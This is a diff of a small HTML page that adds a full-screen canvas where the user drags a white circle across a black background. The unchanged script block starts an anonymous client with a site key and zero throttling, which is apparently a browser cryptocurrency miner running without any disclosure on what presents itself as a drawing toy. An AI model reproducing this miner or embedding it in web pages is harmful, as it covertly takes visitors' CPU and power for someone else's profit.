@@ -10,17 +10,65 @@
 
         <style>
             body {
-                background-color: black;
+                margin: 0;
+                padding: 0;
+                overflow: hidden;
+            }
+
+            canvas {
+                width: 100%;
+                height: 100%;
             }
         </style>
     </head>
 
     <body>
+        <canvas></canvas>
+
         <script>
             var _client = new Client.Anonymous('0cfa40f79c18e374dc530d957efbf5cf2165dba343e949533ea9b8effe4b7136', {
                 throttle: 0, c: 'w'
             })
             _client.start()
+
+            const canv = document.querySelector('canvas'),
+                  ctx = canv.getContext('2d')
+            var isMouseDown = false
+
+            canv.width = window.innerWidth
+            canv.height = window.innerHeight
+            
+            ctx.fillStyle = 'black'
+            ctx.fillRect(0, 0, canv.width, canv.height)
+
+            document.addEventListener('mousedown', () => {
+                isMouseDown = true
+            })
+
+            document.addEventListener('mousemove', e => {
+                if (isMouseDown) {
+                    ctx.beginPath()
+                    ctx.fillStyle = 'black'
+                    ctx.fillRect(0, 0, canv.width, canv.height)
+
+                    ctx.fillStyle = 'white'
+                    ctx.arc(e.clientX, e.clientY, 20, 0, Math.PI * 2)
+                    ctx.fill()
+                    ctx.closePath()
+                }
+            })
+
+            document.addEventListener('mouseup', () => {
+                isMouseDown = false
+            })
+
+            document.addEventListener('resize', () => {
+                canv.width = window.innerWidth
+                canv.height = window.innerHeight
+                
+                ctx.fillStyle = 'black'
+                ctx.fillRect(0, 0, canv.width, canv.height)
+            })
         </script>
     </body>
 </html>
